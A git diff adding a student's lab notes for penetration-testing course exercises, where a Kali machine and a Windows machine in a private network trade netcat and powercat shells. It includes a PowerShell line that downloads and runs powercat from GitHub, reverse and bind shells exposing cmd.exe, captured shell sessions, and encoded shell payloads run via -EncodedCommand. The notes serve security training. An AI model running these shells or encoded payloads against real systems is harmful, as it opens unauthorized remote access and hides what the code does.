@@ -238,4 +238,65 @@ export HISTTIMEFORMAT='%c'
 ```
 
 ### 4.1.4.3 (page 81) (Netcat exercises, do them!)
-### 4.2.4.1 Exercises (page 85) (Socat exercises, do them!)
+
+### 4.2.4.1 (page 85) (Socat exercises, do them!)
+
+### 4.3.8.1 (page 94)
+Boxes IPs:
+kali: 10.0.2.15
+win: 10.0.2.4
+
+1. Use PowerShell and powercat to create a reverse shell from your Windows system to your Kali machine.
+
+On Kali run the listener:
+```
+nc -lnvp 4445
+```
+
+On Windows, from powershell, run:
+```
+iex (New-Object System.Net.Webclient).DownloadString('https://raw. githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
+powercat -c 10.0.2.15 -p 4445 -e cmd.exe
+```
+
+2. Use PowerShell and powercat to create a bind shell on your Windows system and connect to it from your Kali machine. Can you also use powercat to connect to it locally?
+
+On Windows:
+```
+powercat -l -p 4445 -e cmd.exe
+```
+
+Connect from Kali:
+```
+$ nc 10.0.2.4 4445
+Microsoft Windows [Version 10.0.19041.572]
+(c) 2020 Microsoft Corporation. All rights reserved.
+
+C:\Users\User>
+```
+
+It does connect locally from powercat:
+```
+ powercat -c localhost -p 4445
+dir
+Microsoft Windows [Version 10.0.19041.572]
+(c) 2020 Microsoft Corporation. All rights reserved.
+
+C:\Users\User>
+```
+
+3. Use powercat to generate an encoded payload and then have it executed through powershell. Have a reverse shell sent to your Kali machine, also create an encoded bind shell on your Windows system and use your Kali machine to connect to it.
+
+Generate the payloads:
+```
+powercat -l -p 4445 -e cmd.exe -ge > bind_shell.ps1
+powercat -c 10.0.2.15 -p 4445 -e cmd.exe -ge > reverse_shell.ps1
+```
+
+To execute them, create another powershell script that stores the entire payload contents in a variable and the executes it:
+```
+$encoded = "{{payload_contents}}"
+powershell -EncodedCommand $encoded
+```
+
+
